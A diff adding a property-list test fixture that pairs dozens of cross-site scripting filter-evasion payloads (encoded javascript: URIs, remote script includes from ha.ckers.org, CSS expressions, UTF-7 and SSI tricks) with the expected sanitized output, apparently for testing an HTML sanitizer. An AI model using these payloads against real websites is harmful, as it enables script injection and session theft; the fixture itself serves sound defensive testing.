@@ -1,0 +1,744 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>BASE</key>
+	<array>
+		<string>&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>BGSOUND</key>
+	<array>
+		<string>&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>BODY ONLOAD</key>
+	<array>
+		<string>&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;</string>
+		<string></string>
+	</array>
+	<key>BODY background-image</key>
+	<array>
+		<string>&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>Case Insensitive</key>
+	<array>
+		<string>&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;</string>
+		<string></string>
+	</array>
+	<key>Character Encoding Example</key>
+	<array>
+		<string>&lt;
+                %3C
+                &amp;lt
+                &amp;lt;
+                &amp;LT
+                &amp;LT;
+                &amp;#60
+                &amp;#060
+                &amp;#0060
+                
+                &amp;#00060
+                &amp;#000060
+                &amp;#0000060
+                &amp;#60;
+                &amp;#060;
+                &amp;#0060;
+                &amp;#00060;
+                &amp;#000060;
+                &amp;#0000060;
+                &amp;#x3c
+                &amp;#x03c
+                &amp;#x003c
+                &amp;#x0003c
+                &amp;#x00003c
+                &amp;#x000003c
+                &amp;#x3c;
+                &amp;#x03c;
+                
+                &amp;#x003c;
+                &amp;#x0003c;
+                &amp;#x00003c;
+                &amp;#x000003c;
+                &amp;#X3c
+                &amp;#X03c
+                &amp;#X003c
+                &amp;#X0003c
+                &amp;#X00003c
+                &amp;#X000003c
+                &amp;#X3c;
+                &amp;#X03c;
+                &amp;#X003c;
+                &amp;#X0003c;
+                &amp;#X00003c;
+                &amp;#X000003c;
+                &amp;#x3C
+                
+                &amp;#x03C
+                &amp;#x003C
+                &amp;#x0003C
+                &amp;#x00003C
+                &amp;#x000003C
+                &amp;#x3C;
+                &amp;#x03C;
+                &amp;#x003C;
+                &amp;#x0003C;
+                &amp;#x00003C;
+                &amp;#x000003C;
+                &amp;#X3C
+                &amp;#X03C
+                &amp;#X003C
+                &amp;#X0003C
+                &amp;#X00003C
+                &amp;#X000003C
+                
+                &amp;#X3C;
+                &amp;#X03C;
+                &amp;#X003C;
+                &amp;#X0003C;
+                &amp;#X00003C;
+                &amp;#X000003C;
+                \x3c
+                \x3C
+                \u003c
+                \u003C</string>
+		<string>&amp;lt;
+                %3C
+                &amp;amp;lt
+                &amp;lt;
+                &amp;amp;LT
+                &amp;amp;LT;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                &amp;lt;
+                \x3c
+                \x3C
+                \u003c
+                \u003C</string>
+	</array>
+	<key>Commented-out Block</key>
+	<array>
+		<string>&lt;!--[if gte IE 4]&gt;
+                &lt;SCRIPT&gt;alert(&apos;XSS&apos;);&lt;/SCRIPT&gt;
+                &lt;![endif]--&gt;</string>
+		<string></string>
+	</array>
+	<key>Content Replace</key>
+	<array>
+		<string>&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;</string>
+		<string>&lt;a href=&quot;http://www.gohttp//www.google.com/ogle.com/&quot;&gt;XSS&lt;/a&gt;</string>
+	</array>
+	<key>Cookie Manipulation</key>
+	<array>
+		<string>&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>DIV background-image 1</key>
+	<array>
+		<string>&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;</string>
+		<string>&lt;div&gt;&lt;/div&gt;</string>
+	</array>
+	<key>DIV background-image 2</key>
+	<array>
+		<string>&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;</string>
+		<string>&lt;div&gt;&lt;/div&gt;</string>
+	</array>
+	<key>DIV expression</key>
+	<array>
+		<string>&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;</string>
+		<string>&lt;div&gt;&lt;/div&gt;</string>
+	</array>
+	<key>DIV w/Unicode</key>
+	<array>
+		<string>&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;</string>
+		<string>&lt;div&gt;&lt;/div&gt;</string>
+	</array>
+	<key>Double open angle brackets</key>
+	<array>
+		<string>&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;</string>
+		<string></string>
+	</array>
+	<key>Dword Encoding</key>
+	<array>
+		<string>&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;</string>
+		<string>&lt;a href=&quot;/&quot;&gt;XSS&lt;/a&gt;</string>
+	</array>
+	<key>Embed Flash</key>
+	<array>
+		<string>&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;</string>
+		<string></string>
+	</array>
+	<key>Embedded Carriage Return</key>
+	<array>
+		<string>&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;</string>
+		<string>&lt;img src=&quot;jav%20ascript%3Aalert(&apos;XSS&apos;);&quot; alt=&quot;jav ascript:alert(&apos;XSS&apos;);&quot; /&gt;</string>
+	</array>
+	<key>Embedded Encoded Tab</key>
+	<array>
+		<string>&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;</string>
+		<string>&lt;img src=&quot;jav%20ascript%3Aalert(&apos;XSS&apos;);&quot; alt=&quot;jav ascript:alert(&apos;XSS&apos;);&quot; /&gt;</string>
+	</array>
+	<key>Embedded Newline</key>
+	<array>
+		<string>&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;</string>
+		<string>&lt;img src=&quot;jav%20ascript%3Aalert(&apos;XSS&apos;);&quot; alt=&quot;jav ascript:alert(&apos;XSS&apos;);&quot; /&gt;</string>
+	</array>
+	<key>Embedded Tab</key>
+	<array>
+		<string>&lt;IMG SRC=&quot;jav	ascript:alert(&apos;XSS&apos;);&quot;&gt;</string>
+		<string>&lt;img src=&quot;jav%20ascript%3Aalert(&apos;XSS&apos;);&quot; alt=&quot;jav ascript:alert(&apos;XSS&apos;);&quot; /&gt;</string>
+	</array>
+	<key>End title tag</key>
+	<array>
+		<string>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;</string>
+		<string></string>
+	</array>
+	<key>Escaping JavaScript escapes</key>
+	<array>
+		<string>\&quot;;alert(&apos;XSS&apos;);//</string>
+		<string>\&quot;;alert(&apos;XSS&apos;);//</string>
+	</array>
+	<key>Evade Regex Filter 1</key>
+	<array>
+		<string>&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</string>
+		<string></string>
+	</array>
+	<key>Evade Regex Filter 2</key>
+	<array>
+		<string>&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</string>
+		<string></string>
+	</array>
+	<key>Evade Regex Filter 3</key>
+	<array>
+		<string>&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</string>
+		<string></string>
+	</array>
+	<key>Evade Regex Filter 4</key>
+	<array>
+		<string>&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</string>
+		<string></string>
+	</array>
+	<key>Evade Regex Filter 5</key>
+	<array>
+		<string>&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</string>
+		<string></string>
+	</array>
+	<key>Extra dot for Absolute DNS</key>
+	<array>
+		<string>&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;</string>
+		<string>&lt;a href=&quot;http://www.google.com./&quot;&gt;XSS&lt;/a&gt;</string>
+	</array>
+	<key>Extraneous Open Brackets</key>
+	<array>
+		<string>&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;</string>
+		<string>&amp;lt;</string>
+	</array>
+	<key>FRAME</key>
+	<array>
+		<string>&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;</string>
+		<string></string>
+	</array>
+	<key>Filter Evasion 1</key>
+	<array>
+		<string>&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</string>
+		<string>PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&amp;gt;</string>
+	</array>
+	<key>Filter Evasion 2</key>
+	<array>
+		<string>&lt;SCRIPT a=&quot;&gt;&apos;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</string>
+		<string></string>
+	</array>
+	<key>Firefox Lookups 1</key>
+	<array>
+		<string>&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;</string>
+		<string>&lt;a href=&quot;//google&quot;&gt;XSS&lt;/a&gt;</string>
+	</array>
+	<key>Firefox Lookups 2</key>
+	<array>
+		<string>&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;</string>
+		<string>&lt;a href=&quot;http://google&quot;&gt;XSS&lt;/a&gt;</string>
+	</array>
+	<key>Firefox Lookups 3</key>
+	<array>
+		<string>&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;</string>
+		<string>&lt;a href=&quot;http://google&quot;&gt;XSS&lt;/a&gt;</string>
+	</array>
+	<key>Grave Accents</key>
+	<array>
+		<string>&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;</string>
+		<string>&lt;img src=&quot;%60javascript%3Aalert(&quot; alt=&quot;`javascript:alert(&amp;quot;RSnake&quot; /&gt;</string>
+	</array>
+	<key>HTML Entities</key>
+	<array>
+		<string>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</string>
+		<string></string>
+	</array>
+	<key>Half-Open HTML/JavaScript</key>
+	<array>
+		<string>&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;</string>
+		<string></string>
+	</array>
+	<key>Hex Encoding</key>
+	<array>
+		<string>&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;</string>
+		<string>&lt;a href=&quot;/&quot;&gt;XSS&lt;/a&gt;</string>
+	</array>
+	<key>Hex Encoding w/out Semicolons</key>
+	<array>
+		<string>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</string>
+		<string></string>
+	</array>
+	<key>IFRAME</key>
+	<array>
+		<string>&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;</string>
+		<string></string>
+	</array>
+	<key>IMG Dynsrc</key>
+	<array>
+		<string>&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>IMG Embedded commands 1</key>
+	<array>
+		<string>&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;</string>
+		<string>&lt;img src=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot; alt=&quot;somecommand.php?somevariables=maliciousc&quot; /&gt;</string>
+	</array>
+	<key>IMG Lowsrc</key>
+	<array>
+		<string>&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>IMG No Quotes/Semicolon</key>
+	<array>
+		<string>&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;</string>
+		<string></string>
+	</array>
+	<key>IMG STYLE w/expression</key>
+	<array>
+		<string>exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);
+                xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</string>
+		<string>exp/*</string>
+	</array>
+	<key>IMG w/JavaScript Directive</key>
+	<array>
+		<string>&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>IMG w/VBscript</key>
+	<array>
+		<string>&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;</string>
+		<string></string>
+	</array>
+	<key>INPUT Image</key>
+	<array>
+		<string>&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>IP Encoding</key>
+	<array>
+		<string>&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;</string>
+		<string>&lt;a href=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/a&gt;</string>
+	</array>
+	<key>Image w/CharCode</key>
+	<array>
+		<string>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</string>
+		<string></string>
+	</array>
+	<key>JavaScript Includes</key>
+	<array>
+		<string>&lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;</string>
+		<string>&lt;br /&gt;</string>
+	</array>
+	<key>JavaScript Link Location</key>
+	<array>
+		<string>&lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;</string>
+		<string>&lt;a&gt;XSS&lt;/a&gt;</string>
+	</array>
+	<key>LAYER</key>
+	<array>
+		<string>&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;</string>
+		<string></string>
+	</array>
+	<key>List-style-image</key>
+	<array>
+		<string>&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</string>
+		<string>&lt;ul&gt;&lt;li&gt;XSS&lt;/li&gt;&lt;/ul&gt;</string>
+	</array>
+	<key>Livescript</key>
+	<array>
+		<string>&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>Local .htc file</key>
+	<array>
+		<string>&lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>Long UTF-8 Unicode w/out Semicolons</key>
+	<array>
+		<string>&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;</string>
+		<string></string>
+	</array>
+	<key>META</key>
+	<array>
+		<string>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>META w/additional URL parameter</key>
+	<array>
+		<string>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>META w/data:URL</key>
+	<array>
+		<string>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>Malformed IMG Tags</key>
+	<array>
+		<string>&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</string>
+		<string>&quot;&amp;gt;</string>
+	</array>
+	<key>Mixed Encoding</key>
+	<array>
+		<string>&lt;A HREF=&quot;h
+                tt	p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;</string>
+		<string>&lt;a href=&quot;h%20tt%20p%3A//6%206.000146.0x7.147/&quot;&gt;XSS&lt;/a&gt;</string>
+	</array>
+	<key>Mocha</key>
+	<array>
+		<string>&lt;IMG SRC=&quot;mocha:[code]&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>Multiline w/Carriage Returns</key>
+	<array>
+		<string>&lt;IMG
+SRC
+=
+&quot;
+j
+a
+v
+a
+s
+c
+r
+i
+p
+t
+:
+a
+l
+e
+r
+t
+(
+&apos;
+X
+S
+S
+&apos;
+)
+&quot;
+&gt;</string>
+		<string>&lt;img src=&quot;j%20a%20v%20a%20s%20c%20r%20i%20p%20t%20%3A%20a%20l%20e%20r%20t%20(%20&apos;%20X%20S%20S%20&apos;%20)&quot; alt=&quot;j a v a s c r i p t : a l e r t ( &apos; X S&quot; /&gt;</string>
+	</array>
+	<key>No Closing Script Tag</key>
+	<array>
+		<string>&lt;SCRIPT SRC=http://ha.ckers.org/xss.js</string>
+		<string></string>
+	</array>
+	<key>No Quotes/Semicolons</key>
+	<array>
+		<string>&lt;SCRIPT&gt;a=/XSS/
+                alert(a.source)&lt;/SCRIPT&gt;</string>
+		<string></string>
+	</array>
+	<key>Non-Alpha/Non-Digit</key>
+	<array>
+		<string>&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</string>
+		<string></string>
+	</array>
+	<key>Non-Alpha/Non-Digit Part 2</key>
+	<array>
+		<string>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</string>
+		<string></string>
+	</array>
+	<key>Null Chars 1</key>
+	<array>
+		<string>&lt;IMG SRC=java</string>
+		<string></string>
+	</array>
+	<key>Null Chars 2</key>
+	<array>
+		<string>&amp;&lt;SCR</string>
+		<string>&amp;amp;</string>
+	</array>
+	<key>OBJECT</key>
+	<array>
+		<string>&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;</string>
+		<string></string>
+	</array>
+	<key>OBJECT w/Embedded XSS</key>
+	<array>
+		<string>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;</string>
+		<string></string>
+	</array>
+	<key>Octal Encoding</key>
+	<array>
+		<string>&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;</string>
+		<string>&lt;a href=&quot;/&quot;&gt;XSS&lt;/a&gt;</string>
+	</array>
+	<key>PHP</key>
+	<array>
+		<string>&lt;? echo(&apos;&lt;SCR)&apos;;
+                echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</string>
+		<string>&amp;lt;? echo(&apos;alert(&quot;XSS&quot;)&apos;); ?&amp;gt;</string>
+	</array>
+	<key>Protocol Resolution Bypass</key>
+	<array>
+		<string>&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;</string>
+		<string>&lt;a href=&quot;//www.google.com/&quot;&gt;XSS&lt;/a&gt;</string>
+	</array>
+	<key>Protocol resolution in script tags</key>
+	<array>
+		<string>&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;</string>
+		<string></string>
+	</array>
+	<key>Remote Stylesheet 1</key>
+	<array>
+		<string>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>Remote Stylesheet 2</key>
+	<array>
+		<string>&lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;</string>
+		<string></string>
+	</array>
+	<key>Remote Stylesheet 3</key>
+	<array>
+		<string>&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>Remote Stylesheet 4</key>
+	<array>
+		<string>&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;</string>
+		<string></string>
+	</array>
+	<key>Removing Cnames</key>
+	<array>
+		<string>&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;</string>
+		<string>&lt;a href=&quot;http://google.com/&quot;&gt;XSS&lt;/a&gt;</string>
+	</array>
+	<key>Rename .js to .jpg</key>
+	<array>
+		<string>&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;</string>
+		<string></string>
+	</array>
+	<key>SCRIPT w/Alert()</key>
+	<array>
+		<string>&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;</string>
+		<string></string>
+	</array>
+	<key>SCRIPT w/Char Code</key>
+	<array>
+		<string>&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</string>
+		<string></string>
+	</array>
+	<key>SCRIPT w/Source File</key>
+	<array>
+		<string>&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;</string>
+		<string></string>
+	</array>
+	<key>SSI</key>
+	<array>
+		<string>&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;</string>
+		<string></string>
+	</array>
+	<key>STYLE</key>
+	<array>
+		<string>&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;</string>
+		<string></string>
+	</array>
+	<key>STYLE w/Anonymous HTML</key>
+	<array>
+		<string>&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>STYLE w/Comment</key>
+	<array>
+		<string>&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>STYLE w/background</key>
+	<array>
+		<string>&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;</string>
+		<string></string>
+	</array>
+	<key>STYLE w/background-image</key>
+	<array>
+		<string>&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</string>
+		<string>&lt;a class=&quot;XSS&quot;&gt;&lt;/a&gt;</string>
+	</array>
+	<key>STYLE w/broken up JavaScript</key>
+	<array>
+		<string>&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;</string>
+		<string></string>
+	</array>
+	<key>Spaces/Meta Chars</key>
+	<array>
+		<string>&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>Stylesheet</key>
+	<array>
+		<string>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</string>
+		<string></string>
+	</array>
+	<key>TABLE</key>
+	<array>
+		<string>&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TABLE&gt;</string>
+		<string></string>
+	</array>
+	<key>TD</key>
+	<array>
+		<string>&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;</string>
+		<string></string>
+	</array>
+	<key>URL Encoding</key>
+	<array>
+		<string>&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;</string>
+		<string>&lt;a href=&quot;http://www.google.com&quot;&gt;XSS&lt;/a&gt;</string>
+	</array>
+	<key>US-ASCII encoding</key>
+	<array>
+		<string>¼script¾alert(¢XSS¢)¼/script¾</string>
+		<string>scriptalert(XSS)/script</string>
+	</array>
+	<key>UTF-7 Encoding</key>
+	<array>
+		<string>&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-</string>
+		<string>+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-</string>
+	</array>
+	<key>UTF-8 Unicode Encoding</key>
+	<array>
+		<string>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</string>
+		<string></string>
+	</array>
+	<key>XML (locally hosted)</key>
+	<array>
+		<string>&lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;
+                &lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;</string>
+		<string>&lt;span&gt;&lt;/span&gt;</string>
+	</array>
+	<key>XML HTML+TIME</key>
+	<array>
+		<string>&lt;HTML&gt;&lt;BODY&gt;
+                &lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;
+                
+                &lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;
+                &lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&lt;SCRIPT DEFER&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt; &lt;/BODY&gt;&lt;/HTML&gt;</string>
+		<string>&amp;lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&amp;gt;
+                
+                &amp;lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&amp;gt;</string>
+	</array>
+	<key>XML data island w/CDATA</key>
+	<array>
+		<string>&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt;
+                
+                &lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;</string>
+		<string>&amp;lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&amp;gt;
+                
+                &lt;span&gt;&lt;/span&gt;</string>
+	</array>
+	<key>XML data island w/comment</key>
+	<array>
